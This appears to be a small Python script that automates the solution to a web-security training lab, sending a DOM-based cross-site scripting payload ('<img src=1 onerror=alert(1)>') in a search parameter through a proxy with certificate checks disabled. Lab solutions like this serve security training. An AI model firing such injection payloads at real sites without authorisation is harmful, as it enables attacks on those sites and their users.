from ...utils import *

import requests

def solve_lab(url, proxies):
    params = {"search": "<img src=1 onerror=alert(1)>"}
    print_info(
        f'Performing DOM-based XSS attack by visiting "{url}" with the following parameters:'
    )
    print(params)

    requests.get(url, params=params, proxies=proxies, verify=False)
    print_success("DOM-based XSS attack performed.\n")

